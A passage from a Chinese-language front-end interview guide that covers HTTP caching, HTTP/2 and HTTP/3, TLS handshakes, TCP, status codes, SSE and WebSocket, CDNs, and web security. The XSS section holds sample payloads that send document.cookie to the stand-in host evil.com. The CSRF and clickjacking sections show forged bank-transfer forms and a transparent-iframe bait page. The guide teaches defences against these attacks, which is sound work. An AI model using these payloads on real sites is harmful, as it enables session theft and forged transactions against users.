| `no-cache` | **可以缓存**，但每次使用前必须向服务端验证 |
| `no-store` | 完全不缓存 |
| `public` / `private` | 是否允许 CDN 等共享缓存存储；`private` 仅浏览器 |
| `immutable` | 新鲜期内即使用户刷新也不重新验证 |
| `must-revalidate` | 过期后必须验证，不许使用过期副本 |
| `stale-while-revalidate=N` | 过期后 N 秒内先返回旧副本，后台异步更新 |

**启发式缓存**：响应既无 `Cache-Control` 也无 `Expires`，但有 `Last-Modified` 时，浏览器会按 `(Date - Last-Modified) × 10%` 估算新鲜期——这是很多「明明没设缓存却被缓存」问题的根源。

### 完整决策流程图

```
发起请求
  │
  ├─ 有 Service Worker 且 fetch 中返回了缓存？ ──是──▶ 使用 SW 响应
  │
  ▼
本地有该资源的 HTTP 缓存副本？
  │否 ─────────────────────────────────────────────▶ 正常请求服务器 → 200 → 按响应头决定是否存储
  │是
  ▼
响应头含 no-store？ ──是──▶（实际上根本不会被存储）正常请求
  │否
  ▼
含 no-cache？ ──是──▶ 跳到「协商缓存」
  │否
  ▼
在新鲜期内？（Cache-Control: max-age/s-maxage > Expires > 启发式）
  │是 ──▶ 强缓存命中：200 (from memory/disk cache)，不发请求
  │否
  ▼
在 stale-while-revalidate 窗口内？ ──是──▶ 先返回旧副本，后台发条件请求更新
  │否
  ▼
【协商缓存】有 ETag 或 Last-Modified？
  │否 ──▶ 正常请求 → 200
  │是
  ▼
发送条件请求：If-None-Match: <ETag>（优先） / If-Modified-Since: <时间>
  │
  ▼
服务端比较
  ├─ 未变化 ──▶ 304 Not Modified（更新本地副本的新鲜期头部）→ 使用本地副本
  └─ 已变化 ──▶ 200 + 新内容 + 新 ETag/Last-Modified → 覆盖缓存
```

**用户行为对缓存的影响**

| 操作 | 强缓存 | 协商缓存 |
|---|---|---|
| 地址栏回车 / 链接跳转 | 生效 | 生效 |
| 普通刷新（F5） | 主文档重新验证；子资源 Chromium 仍可走强缓存 | 生效 |
| 强制刷新（Ctrl/Cmd+Shift+R） | 跳过（请求带 `Cache-Control: no-cache`） | 跳过 |
| DevTools 勾选 Disable cache | 跳过 | 跳过 |

### 推荐缓存策略表

| 资源 | 推荐响应头 | 理由 |
|---|---|---|
| HTML 入口（index.html） | `Cache-Control: no-cache` + `ETag` | 必须拿到最新入口以引用新 hash 资源；304 成本低 |
| 带 hash 的 JS/CSS（`app.3f9a1c.js`） | `Cache-Control: public, max-age=31536000, immutable` | 内容变则文件名变，可永久缓存 |
| 图片 / 字体（带 hash） | `public, max-age=31536000, immutable` | 同上；字体跨域需 CORS 头 |
| 图片（不带 hash，如用户头像） | `public, max-age=86400, stale-while-revalidate=604800` | 允许短期旧数据，后台刷新 |
| API（用户私有数据） | `private, no-cache` 或 `no-store` | 防止 CDN 缓存私有数据；敏感数据用 no-store |
| API（公共、可容忍延迟，如配置/榜单） | `public, max-age=60, s-maxage=300, stale-while-revalidate=60` | 浏览器短缓存、CDN 稍长 |
| Service Worker 脚本 | `no-cache` | 确保及时发现新版本 |
| 敏感页面（支付、账户） | `no-store` | 不在磁盘留存，也不进 bfcache |

### Nginx 配置示例

```nginx
location = /index.html {
  add_header Cache-Control "no-cache";
}
location ~* \.[0-9a-f]{8,}\.(js|css|woff2|png|jpg|svg|webp)$ {
  add_header Cache-Control "public, max-age=31536000, immutable";
}
location /api/ {
  add_header Cache-Control "private, no-cache";
  proxy_pass http://backend;
}
```

### 面试答题要点
1. 先强缓存后协商缓存：强缓存命中不发请求，过期后带 `If-None-Match/If-Modified-Since` 协商，304 复用。
2. 优先级：`Cache-Control` > `Expires`；`ETag` > `Last-Modified`。
3. `no-cache` ≠ 不缓存，`no-store` 才是。
4. 最佳实践：HTML `no-cache`，带 hash 的静态资源一年 + `immutable`，API 按数据性质 `private/no-store`。
5. Last-Modified 缺陷：秒级精度、内容未变但时间变（重新部署）也会失效，所以有 ETag。

### 易错点 / 追问
- ETag 在多台服务器上生成方式不一致（如 Apache 用 inode）会导致 304 命中率低，需统一。
- 强 ETag `"abc"` vs 弱 ETag `W/"abc"`（语义等价即可）。
- memory cache vs disk cache：当前会话内且小文件、刚用过的倾向内存；关闭标签后只剩 disk cache。浏览器自行决定，不可控。
- `Vary: Accept-Encoding / Origin` 影响缓存键。
- 追问「发版后用户仍是旧页面」：HTML 被强缓存或 CDN 未刷新；解法 HTML `no-cache` + CDN purge。

---

## 2.2 HTTP/1.1 → HTTP/2 → HTTP/3

> 考频 ★★★

### 对比表

| 维度 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| 传输层 | TCP | TCP | **QUIC（基于 UDP）** |
| 报文格式 | 文本 | 二进制分帧（帧/流） | 二进制帧（在 QUIC 流上） |
| 并发 | 每域约 6 个连接；管线化基本不可用 | **单连接多路复用** | 单连接多路复用，**流间互不阻塞** |
| 队头阻塞 | HTTP 层 + TCP 层 | 解决 HTTP 层，**仍有 TCP 层** | 基本解决（单流丢包只影响该流） |
| 头部压缩 | 无 | HPACK（静态表 + 动态表 + 哈夫曼） | QPACK（适配乱序到达） |
| 握手 | TCP 1 RTT + TLS 1~2 RTT | 同左（实际都用 TLS） | 首连 1 RTT，恢复 0-RTT |
| 加密 | 可选 | 浏览器只支持 h2（基于 TLS） | 强制 TLS 1.3 |
| 连接迁移 | 无（四元组变即断） | 无 | 有（Connection ID，Wi-Fi 切 4G 不断） |
| 服务器推送 | 无 | 有，但 Chrome 已移除（106） | 规范有，浏览器基本不支持 |
| 优先级 | 无 | 依赖树（复杂，已弃用） | Extensible Priorities（`Priority` 头） |

### 原理要点
- **HTTP/1.1 痛点**：队头阻塞（同一连接请求必须按序响应）、连接数限制、头部冗余（每次带 Cookie、UA）。于是有了雪碧图、域名分片、资源合并等「hack」。
- **HTTP/2**：把消息拆成帧（HEADERS、DATA），每个帧带流 ID，多个流在一条 TCP 连接上交错传输。但 TCP 是按字节序可靠交付的，一个包丢失，后续所有流的数据都要等重传 —— **TCP 队头阻塞**；丢包率高的弱网下 HTTP/2 甚至不如 HTTP/1.1 多连接。
- **HTTP/3 / QUIC**：在用户态基于 UDP 实现可靠传输、拥塞控制，每个流独立保证顺序；TLS 1.3 内置于握手；用 Connection ID 标识连接支持迁移。发现机制：`Alt-Svc: h3=":443"` 响应头或 DNS HTTPS 记录。

### 面试答题要点
1. HTTP/2 解决了：HTTP 层队头阻塞（多路复用）、头部冗余（HPACK）、连接数限制；二进制分帧更高效。
2. HTTP/2 还剩的问题：TCP 层队头阻塞、TCP + TLS 握手延迟、网络切换连接中断。
3. HTTP/3 用 QUIC over UDP 解决以上问题：独立流、0/1-RTT、连接迁移。
4. 升级 HTTP/2 后应去掉域名分片、过度合并等 HTTP/1.1 时代的优化。
5. Server Push 已被弃用，替代方案是 `103 Early Hints` + `preload`。

### 易错点 / 追问
- 「HTTP/2 完全解决队头阻塞」是错的。
- QUIC 可能被企业防火墙封 UDP，浏览器会回退 HTTP/2。
- HTTP/1.1 的 Keep-Alive 默认开启；管线化（pipelining）规范存在但浏览器默认不启用。
- 追问「HPACK 怎么压缩」：静态表 61 个常用头，动态表记录本连接已发送过的头，用索引替代；字符串用哈夫曼编码。

---

## 2.3 HTTPS 握手与证书校验

> 考频 ★★★

### 是什么 / 原理
HTTPS = HTTP + TLS。**非对称加密**用于身份认证与密钥协商，**对称加密**（AES-GCM、ChaCha20）用于传输数据，**摘要/MAC**保证完整性。

### TLS 1.2 握手（ECDHE，2-RTT）

```
Client                                            Server
  │── ClientHello（版本、client_random、密码套件列表、SNI）──▶│
  │◀── ServerHello（选定套件、server_random）                 │
  │◀── Certificate（证书链）                                  │
  │◀── ServerKeyExchange（ECDHE 公钥 + 签名）                 │
  │◀── ServerHelloDone                              【RTT 1】│
  │── ClientKeyExchange（客户端 ECDHE 公钥）               ──▶│
  │── ChangeCipherSpec + Finished（加密）                  ──▶│
  │◀── ChangeCipherSpec + Finished                  【RTT 2】│
  │══ 双方用 client_random + server_random + 预主密钥 派生会话密钥 ══│
  │══════════════ 加密的 HTTP 数据 ══════════════════════════│
```

若使用 RSA 密钥交换：客户端用证书公钥加密预主密钥发给服务端 —— 私钥泄露后历史流量可被解密，**不具备前向安全**。

### TLS 1.3 握手（1-RTT）

```
Client                                            Server
  │── ClientHello + key_share（直接猜测并附上 ECDHE 公钥）  ──▶│
  │◀── ServerHello + key_share                                │
  │◀── {EncryptedExtensions, Certificate, CertificateVerify, Finished}（已加密）
  │── {Finished} + 加密的 HTTP 请求                【RTT 1】 ──▶│

会话恢复 0-RTT：ClientHello + PSK + early_data（首包即带应用数据）
```

| 对比 | TLS 1.2 | TLS 1.3 |
|---|---|---|
| 完整握手 | 2-RTT | 1-RTT |
| 恢复 | 1-RTT（Session ID/Ticket） | 0-RTT（PSK + early data） |
| 密钥交换 | RSA / DHE / ECDHE | 仅 (EC)DHE，**强制前向安全** |
| 密码套件 | 很多，含不安全的（RC4、CBC、SHA1） | 精简为 5 个 AEAD 套件 |
| 证书加密 | 明文传输 | 加密传输 |

### 证书校验

```
服务端证书（example.com）── 由中间 CA 签名
        └─ 中间 CA 证书 ── 由根 CA 签名
                 └─ 根 CA 证书（预置在操作系统/浏览器信任库）
```

浏览器检查：
1. **证书链**：用上级证书公钥验证下级证书签名，直到信任的根证书；
2. **域名**：SAN（Subject Alternative Name）包含访问的域名（支持通配符一级）；
3. **有效期**：未过期（公共证书最长有效期正逐步缩短，至 2029 年降至 47 天）；
4. **吊销状态**：OCSP / OCSP Stapling / CRL（Chrome 用 CRLSet 自有机制）；
5. **证书透明度（CT）**：需带有 SCT，证明已记录到公开日志。

### 面试答题要点
1. 非对称加密协商密钥 + 对称加密传数据，兼顾安全与性能。
2. TLS 1.2 两个 RTT；TLS 1.3 客户端首包就带 key_share，1 RTT，恢复可 0-RTT。
3. ECDHE 提供前向安全，TLS 1.3 移除了 RSA 密钥交换。
4. 证书校验：签名链到受信根、域名匹配、有效期、吊销、CT。
5. 中间人攻击防御依赖证书校验；HSTS 防止降级到 HTTP（SSL Stripping）。

### 易错点 / 追问
- 「HTTPS 用证书公钥加密所有数据」是错的，数据用对称密钥加密。
- 0-RTT 数据**可被重放**，只能用于幂等请求（如 GET）。
- 抓包工具（Charles/Fiddler）能解 HTTPS 是因为用户手动信任了它的根证书。
- SNI 明文暴露访问域名，ECH（Encrypted Client Hello）用于加密 SNI。
- HSTS 头：`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`。

---

## 2.4 TCP 三次握手 / 四次挥手 / 拥塞控制

> 考频 ★★（拥塞控制 ★）

### 三次握手

```
Client                       Server
  │── SYN, seq=x ─────────────▶│   Client: SYN_SENT
  │◀── SYN+ACK, seq=y, ack=x+1 │   Server: SYN_RCVD
  │── ACK, ack=y+1 ───────────▶│   双方 ESTABLISHED
```

**为什么是三次**：双方都需要确认「自己的发送能力和对方的接收能力」，并同步初始序列号（ISN）；两次无法让服务端确认客户端收到了自己的 SYN，且可能因**历史延迟的 SYN** 建立无效连接，浪费服务端资源。

### 四次挥手

```
Client                       Server
  │── FIN ───────────────────▶│   Client: FIN_WAIT_1
  │◀── ACK ───────────────────│   Client: FIN_WAIT_2 / Server: CLOSE_WAIT（可能还有数据要发）
  │◀── FIN ───────────────────│   Server: LAST_ACK
  │── ACK ───────────────────▶│   Client: TIME_WAIT（等待 2MSL）→ CLOSED
```

**为什么四次**：TCP 全双工，一方 FIN 只表示自己不再发送，对方可能还有数据，所以 ACK 和 FIN 分开发。
**TIME_WAIT 等 2MSL**：确保最后的 ACK 能到达（丢失时对方重发 FIN 可再应答）；让本连接的旧报文在网络中消失，避免干扰新连接。

### 拥塞控制（了解）
- **慢启动**：cwnd 从小值开始，每个 RTT 翻倍（指数增长）至阈值 ssthresh；
- **拥塞避免**：超过阈值后每 RTT 加 1（线性增长）；
- **快重传**：收到 3 个重复 ACK 立即重传，不等超时；
- **快恢复**：ssthresh = cwnd/2，cwnd 置为新阈值，进入拥塞避免；超时则 cwnd 回到初始值。
- 现代算法：CUBIC（Linux 默认）、BBR（基于带宽和 RTT 估计，Google 推出）。
- 区分**流量控制**（接收方窗口 rwnd，防止接收方被淹没）与**拥塞控制**（cwnd，防止网络被淹没）。

### 面试答题要点
1. 三次握手同步双方 ISN、确认双向收发能力，防止历史连接。
2. 四次挥手因全双工，各自独立关闭；主动关闭方进入 TIME_WAIT 等 2MSL。
3. 拥塞控制四算法：慢启动、拥塞避免、快重传、快恢复。
4. 前端关联：慢启动导致首包窗口有限（初始 cwnd 常为 10 个 MSS ≈ 14KB），所以关键 HTML/CSS 尽量放在首 14KB 内。

### 易错点 / 追问
- SYN Flood：伪造大量 SYN 占满半连接队列，防御 SYN Cookie。
- 大量 TIME_WAIT 出现在**主动关闭方**（通常是服务器作为客户端调用下游时）。
- 第三次握手可以携带数据。

---

## 2.5 状态码、请求方法、幂等性

> 考频 ★★

### 常见状态码

| 状态码 | 含义 | 要点 |
|---|---|---|
| 101 Switching Protocols | 协议升级 | WebSocket 握手成功 |
| 103 Early Hints | 预提示 | 服务端处理中先下发 `Link: preload` |
| 200 OK | 成功 | |
| 204 No Content | 成功无响应体 | 预检响应、DELETE |
| 206 Partial Content | 部分内容 | `Range` 断点续传、视频拖动 |
| 301 Moved Permanently | 永久重定向 | 浏览器会缓存；POST 可能被改为 GET |
| 302 Found | 临时重定向 | POST 可能被改为 GET |
| 303 See Other | 用 GET 访问新地址 | 表单提交后跳转（PRG 模式） |
| 304 Not Modified | 协商缓存命中 | 无响应体 |
| 307 Temporary Redirect | 临时重定向，**保持方法和请求体** | HSTS 内部跳转显示 307 |
| 308 Permanent Redirect | 永久重定向，保持方法 | |
| 400 Bad Request | 参数错误 | |
| 401 Unauthorized | 未认证 | 需登录 / Token 失效 |
| 403 Forbidden | 已认证但无权限 | |
| 404 Not Found | 资源不存在 | |
| 405 Method Not Allowed | 方法不允许 | |
| 409 Conflict | 资源冲突 | 并发修改 |
| 413 Content Too Large | 请求体过大 | 上传限制 |
| 429 Too Many Requests | 限流 | 配合 `Retry-After` |
| 500 Internal Server Error | 服务端错误 | |
| 502 Bad Gateway | 网关收到上游无效响应 | 上游服务挂了 |
| 503 Service Unavailable | 服务暂不可用 | 过载、维护 |
| 504 Gateway Timeout | 网关等待上游超时 | |

### 请求方法与幂等性

| 方法 | 语义 | 安全 | 幂等 | 可缓存 |
|---|---|---|---|---|
| GET | 获取 | 是 | 是 | 是 |
| HEAD | 获取头部 | 是 | 是 | 是 |
| OPTIONS | 查询能力 / 预检 | 是 | 是 | 否 |
| POST | 创建 / 提交 | 否 | **否** | 少见 |
| PUT | 整体替换 | 否 | 是 | 否 |
| PATCH | 局部修改 | 否 | **否**（不保证） | 否 |
| DELETE | 删除 | 否 | 是 | 否 |

- **安全**：不修改服务器状态。**幂等**：执行一次和多次，服务器**状态**相同（响应可以不同，如 DELETE 第二次返回 404）。

### 面试答题要点
1. 401 未认证 vs 403 无权限；502 上游异常 vs 504 上游超时。
2. 301/302 可能把 POST 改 GET，307/308 保持方法。
3. 幂等：GET/HEAD/OPTIONS/PUT/DELETE；POST、PATCH 非幂等。
4. 非幂等接口防重复提交：前端按钮锁 + 后端幂等键（`Idempotency-Key` 头 / 唯一业务号）。

### 易错点 / 追问
- GET 与 POST 区别：语义（安全幂等）、缓存、参数位置；「GET 有长度限制」是浏览器/服务器对 URL 的限制，不是协议限制；POST 也不比 GET 更"安全"，明文都能被抓到。
- GET 也可以带 body，但语义未定义，很多实现会忽略。

---

## 2.6 实时通信：WebSocket / SSE / 长轮询

> 考频 ★★★（SSE 因大模型流式输出明显升温）

### 对比

| 维度 | 短轮询 | 长轮询 | SSE | WebSocket |
|---|---|---|---|---|
| 方向 | 客户端拉 | 客户端拉（服务端挂起） | **服务端 → 客户端单向** | **全双工** |
| 协议 | HTTP | HTTP | HTTP（`text/event-stream`） | `ws://` / `wss://`（HTTP Upgrade） |
| 数据 | 任意 | 任意 | 文本（UTF-8） | 文本 + 二进制 |
| 断线重连 | — | 手动 | **内置**（`retry` + `Last-Event-ID`） | 手动（心跳 + 重连） |
| 穿透代理 | 好 | 好 | 好（普通 HTTP） | 一般需代理支持 Upgrade |
| 适用 | 低频状态查询 | 兼容性兜底 | 通知、日志流、**LLM 流式输出** | 聊天、协同编辑、游戏 |

### SSE

```http
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

id: 1
event: token
data: {"delta":"你好"}

retry: 3000
data: [DONE]

```

每条消息以**空行**结束；字段 `data / event / id / retry`，以 `:` 开头为注释（常用作心跳）。

```js
// 原生 EventSource：只能 GET、不能自定义请求头
const es = new EventSource('/api/notify', { withCredentials: true });
es.addEventListener('token', (e) => render(JSON.parse(e.data)));

// LLM 场景：需要 POST + Authorization → 用 fetch 读流
const res = await fetch('/api/chat', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${t}` },
  body: JSON.stringify({ messages }),
  signal: controller.signal,            // 支持「停止生成」
});
const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
let buf = '';
while (true) {
  const { value, done } = await reader.read();
  if (done) break;
  buf += value;
  const events = buf.split('\n\n');
  buf = events.pop();                   // 最后一段可能不完整，留到下次
  for (const ev of events) {
    const data = ev.split('\n').filter(l => l.startsWith('data:')).map(l => l.slice(5).trim()).join('\n');
    if (data && data !== '[DONE]') append(JSON.parse(data).delta);
  }
}
```

### WebSocket

```http
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.example.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

```js
// 心跳 + 指数退避重连
function connect(retry = 0) {
  const ws = new WebSocket('wss://api.example.com/chat');
  let timer;
  ws.onopen = () => { retry = 0; timer = setInterval(() => ws.send('{"type":"ping"}'), 25000); };
  ws.onmessage = (e) => handle(JSON.parse(e.data));
  ws.onclose = () => {
    clearInterval(timer);
    setTimeout(() => connect(retry + 1), Math.min(1000 * 2 ** retry, 30000));
  };
}
```

### 面试答题要点
1. SSE 单向、基于 HTTP、自动重连，最适合 LLM 逐 token 输出；WebSocket 全双工，适合高频双向交互。
2. EventSource 只能 GET 且不能带自定义头，LLM 场景常用 `fetch + ReadableStream` 手动解析 SSE。
3. WebSocket 通过 HTTP Upgrade 握手（101），需心跳保活（防 NAT/代理超时断开）和断线重连。
4. HTTP/1.1 下 SSE 占用连接，同域 6 个上限；HTTP/2 下无此问题。
5. 「停止生成」用 `AbortController` 中断 fetch。

### 易错点 / 追问
- SSE 经过 Nginx 需关闭缓冲：`proxy_buffering off;` 或响应头 `X-Accel-Buffering: no`，否则流被攒成一坨。
- 网络 chunk 边界不等于事件边界，必须用缓冲区按 `\n\n` 切分（多字节字符用 `TextDecoder` 的流模式）。
- WebSocket 不受同源策略限制，服务端要校验 `Origin` 防 CSWSH（跨站 WebSocket 劫持）。
- 新方案：WebTransport（基于 HTTP/3）适合低延迟、不可靠传输场景。

---

## 2.7 CDN 原理

> 考频 ★★

### 是什么 / 原理

```
用户请求 static.example.com
  │
  ▼
本地 DNS ──▶ 权威 DNS 返回 CNAME：static.example.com.cdn-provider.net
  │
  ▼
CDN 的 GSLB（全局负载均衡 DNS）根据用户 IP/运营商/节点负载 → 返回最近边缘节点 IP
  │
  ▼
边缘节点：缓存命中 ──▶ 直接返回
          未命中 ──▶ 回源（可能经过中间层/父节点）──▶ 源站 → 缓存并返回
```

关键概念：
- **缓存键**：默认 URL（可配置是否忽略查询参数）；`Vary` 会扩展缓存键。
- **缓存时间**：遵循源站 `Cache-Control`（`s-maxage` 专门给 CDN），或在 CDN 控制台覆盖。
- **刷新与预热**：发版后对 HTML 做 purge；大文件提前预热到边缘。
- **回源优化**：分层缓存、回源合并、Range 回源。
- **其他能力**：HTTPS 卸载、HTTP/3、压缩、图片处理、WAF/DDoS 防护、边缘计算（Edge Functions）。

### 面试答题要点
1. 核心：DNS CNAME + GSLB 就近调度 + 边缘缓存 + 回源。
2. 静态资源带 hash 长缓存放 CDN；HTML 短缓存或不缓存，发版后刷新。
3. 用独立域名放静态资源可避免携带主站 Cookie（HTTP/2 下需权衡额外的连接开销）。
4. 私有接口禁止 CDN 缓存（`private`），避免串号。

### 易错点 / 追问
- 追问「CDN 资源跨域」：字体、`crossorigin` 脚本需要 CDN 返回 `Access-Control-Allow-Origin`，并注意 `Vary: Origin`。
- 追问「CDN 挂了怎么办」：多 CDN 容灾，资源加载失败回退到备用域名（监听 `error` 事件重试）。
- 第三方 CDN 引入脚本要加 SRI：`<script src="..." integrity="sha384-..." crossorigin="anonymous">`。

---

# 三、安全

## 3.1 XSS

> 考频 ★★★

### 是什么 / 原理
跨站脚本攻击（Cross-Site Scripting）：攻击者把恶意脚本注入页面，在受害者浏览器中**以目标站点的身份**执行，可窃取 Cookie/Token、伪造操作、篡改页面。

| 类型 | 注入点 | 是否经过服务端 | 示例 |
|---|---|---|---|
| 存储型 | 恶意脚本存入数据库（评论、昵称） | 是 | 所有浏览该评论的用户中招，危害最大 |
| 反射型 | 恶意脚本在 URL 参数中，服务端原样拼进 HTML | 是 | 诱导点击 `?q=<script>...` |
| DOM 型 | 前端 JS 把不可信数据写入危险 sink | **否**，纯前端 | `innerHTML = location.hash` |

### 攻击示例

```html
<!-- 存储型：评论内容 -->
<img src=x onerror="fetch('https://evil.com/c?d='+encodeURIComponent(document.cookie))">

<!-- 反射型：服务端模板直接拼接 -->
https://shop.com/search?q=<script>new Image().src='//evil.com/?c='+document.cookie</script>
```

```js
// DOM 型
document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));
// 访问 https://site.com/#<img src=x onerror=alert(1)>

// 属性 / URL 上下文
a.href = userInput;            // userInput = "javascript:alert(1)"
```

### 防御

**1. 输出编码（按上下文）**

```js
// HTML 内容上下文
const escapeHTML = (s) => s.replace(/[&<>"']/g, c => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
}[c]));

// 优先使用安全 API
el.textContent = userInput;                 // 而不是 innerHTML

// URL 上下文：校验协议
const safeUrl = (u) => {
  try { return ['http:', 'https:'].includes(new URL(u, location.href).protocol) ? u : '#'; }
  catch { return '#'; }
};
```

**2. 富文本：白名单过滤**

```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(dirtyHtml);
```

框架层面：React `{}` 和 Vue `{{ }}` 默认转义；**危险出口**是 `dangerouslySetInnerHTML`、`v-html`、`href={userUrl}`、`eval/new Function/setTimeout(string)`。

**3. CSP（内容安全策略）**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  report-to csp-endpoint
```

```html
<script nonce="r4nd0m">/* 只有带正确 nonce 的内联脚本可执行 */</script>
```

- 推荐 **nonce/hash + `strict-dynamic`** 的严格 CSP，而不是域名白名单（白名单容易被 JSONP、CDN 上的旧库绕过）。
- 禁止 `'unsafe-inline'`、`'unsafe-eval'`。
- 上线前可先用 `Content-Security-Policy-Report-Only` 观察。

**4. Trusted Types（DOM 型 XSS）**

```http
Content-Security-Policy: require-trusted-types-for 'script'
```
开启后 `innerHTML` 等 sink 只接受经过策略函数处理的 `TrustedHTML` 对象，直接赋值字符串会报错。

**5. 降低危害**：会话 Cookie 设 `HttpOnly`（脚本读不到），但 XSS 仍可在页面内以用户身份发请求 —— HttpOnly 只是减损，不是根治。

### 面试答题要点
1. 三类：存储型（入库）、反射型（URL 回显）、DOM 型（前端 sink，不经服务端）。
2. 根本防御是**按上下文输出编码**；不可信数据不进 `innerHTML/v-html/eval`。
3. 富文本用 DOMPurify 白名单过滤。
4. 纵深防御：严格 CSP（nonce + strict-dynamic）、Trusted Types、HttpOnly Cookie。
5. 输入校验辅助，不能替代输出编码。

### 易错点 / 追问
- 「前端过滤了就安全」：攻击者可绕过前端直接调接口，服务端也要处理。
- 只转义 `<>` 不够：在属性、URL、JS 字符串上下文中有不同的逃逸方式。
- `innerHTML` 插入的 `<script>` 不会执行，但 `<img onerror>` 会。
- JSON 嵌入 HTML（SSR 注水数据）要转义 `</script>` 和 `<`。

---

## 3.2 CSRF

> 考频 ★★★

### 是什么 / 原理
跨站请求伪造（Cross-Site Request Forgery）：用户已登录 A 站，访问恶意站 B，B 诱导浏览器向 A 发请求，浏览器**自动携带 A 的 Cookie**，A 误以为是用户本人操作。
**本质**：攻击者不能读取 Cookie，只是「借用」浏览器自动带 Cookie 的机制。

### 攻击示例

```html
<!-- 恶意站点 evil.com 的页面 -->

<!-- GET 型：只要加载就触发 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- POST 型：自动提交的隐藏表单（简单请求，无需预检） -->
<form id="f" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```

### 防御

**1. SameSite Cookie**

```http
Set-Cookie: sid=abc; Path=/; Secure; HttpOnly; SameSite=Lax
```
`Lax` 已能拦截跨站 POST 表单、img、iframe、fetch；`Strict` 更彻底但影响外链进入体验。

**2. CSRF Token（同步器令牌 / 双重提交）**

```js
// 服务端：在会话中生成 token，渲染进页面或通过接口下发
// 前端：每个修改类请求带在头部
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
  credentials: 'same-origin',
  body: JSON.stringify({ to, amount }),
});

// 服务端校验（Express 示意）
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  if (req.get('X-CSRF-Token') !== req.session.csrfToken) return res.sendStatus(403);
  next();
});
```
攻击者无法读取目标站页面/Cookie（同源策略），所以拿不到 token。双重提交：token 同时放在 Cookie（非 HttpOnly，建议 `__Host-` 前缀）和请求头，服务端比对二者一致。

**3. 校验 Origin / Referer**

```js
const allowed = new Set(['https://bank.com']);
const origin = req.get('Origin') || new URL(req.get('Referer') || 'null:').origin;
if (!allowed.has(origin)) return res.sendStatus(403);
```

**4. Fetch Metadata（现代推荐）**

```js
// 浏览器自动带 Sec-Fetch-Site: same-origin | same-site | cross-site | none
if (req.get('Sec-Fetch-Site') === 'cross-site' && req.method !== 'GET') return res.sendStatus(403);
```

**5. 其他**：修改类操作不用 GET；关键操作二次确认（密码、验证码）；API 使用 `Authorization: Bearer` 头鉴权而非 Cookie 时天然免疫 CSRF（但需防 XSS 偷 Token）。

### 面试答题要点
1. CSRF 利用浏览器自动带 Cookie，攻击者借用身份但读不到数据。
2. 防御：SameSite=Lax/Strict、CSRF Token、Origin/Referer 校验、Fetch Metadata。
3. GET 必须无副作用，否则 Lax 也防不住（Lax 允许顶级 GET 导航带 Cookie）。
4. XSS vs CSRF：XSS 是在目标站执行脚本，能读能写；CSRF 在第三方站发请求，只能写不能读。存在 XSS 时 CSRF 防御基本失效。

### 易错点 / 追问
- SameSite 只防**跨站**，同站的子域（如被攻陷的 `blog.example.com`）仍可攻击 `example.com`。
- CORS 不防 CSRF：表单提交和简单请求根本不受 CORS 约束。
- Referer 可能被隐私策略去掉（`Referrer-Policy`），缺失时的处理策略要明确。
- 登录 CSRF：攻击者让受害者登录攻击者账号，登录接口也要防护。

---

## 3.3 点击劫持

> 考频 ★★

### 是什么 / 原理
攻击者用透明 `iframe` 把目标站点覆盖在诱饵按钮上，用户以为在点「领奖」，实际点击的是目标站的「确认转账 / 关注」。

```html
<!-- evil.com -->
<style>
  iframe { position: absolute; top: 0; left: 0; opacity: 0; z-index: 2; width: 500px; height: 300px; }
  .bait { position: absolute; top: 120px; left: 80px; z-index: 1; }
</style>
<button class="bait">点击领取红包</button>
<iframe src="https://bank.com/confirm-transfer"></iframe>
```

### 防御

```http
# 现代标准（优先）
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

# 兼容老浏览器
X-Frame-Options: DENY            # 或 SAMEORIGIN（ALLOW-FROM 已废弃）
```

```js
// JS 防御（兜底，可被 sandbox iframe 绕过）
if (window.top !== window.self) window.top.location = window.self.location;
```

### 面试答题要点
1. 原理：透明 iframe 覆盖诱导点击。
2. 首选 CSP `frame-ancestors`，兼容用 `X-Frame-Options: DENY/SAMEORIGIN`。
3. 两者同时存在时，支持 CSP 的浏览器以 `frame-ancestors` 为准。
4. 敏感操作加二次确认。

### 易错点 / 追问
- `X-Frame-Options` 和 `frame-ancestors` 只能通过**响应头**设置，`<meta>` 中无效。
- Frame busting JS 可被 `<iframe sandbox="allow-forms">`（禁脚本）绕过。

---

## 3.4 依赖供应链安全

> 考频 ★★

### 是什么 / 原理
前端项目依赖成百上千个 npm 包，任何一个被投毒都会进入产物或开发者机器。常见风险：
- **账号被盗 / 维护者投毒**：如 2025 年 9 月 chalk、debug 等高下载量包被钓鱼盗号后发布恶意版本，以及随后的 Shai-Hulud 自传播蠕虫事件；
- **Typosquatting**：仿冒包名（`lodahs`）；
- **依赖混淆**：公网发布与内部私有包同名的高版本包；
- **安装脚本**：`postinstall` 在安装时执行任意代码；
- **CDN 引入的第三方脚本被篡改**。

### 配置 / 命令示例

```bash
npm ci                      # 严格按锁文件安装，CI 必用
npm audit --omit=dev        # 检查生产依赖已知漏洞
npm audit fix               # 自动升级到修复版本（注意 --force 可能引入破坏性变更）
npm install --ignore-scripts
pnpm install --frozen-lockfile
```

```ini
# .npmrc
ignore-scripts=true
registry=https://registry.npmmirror.com/
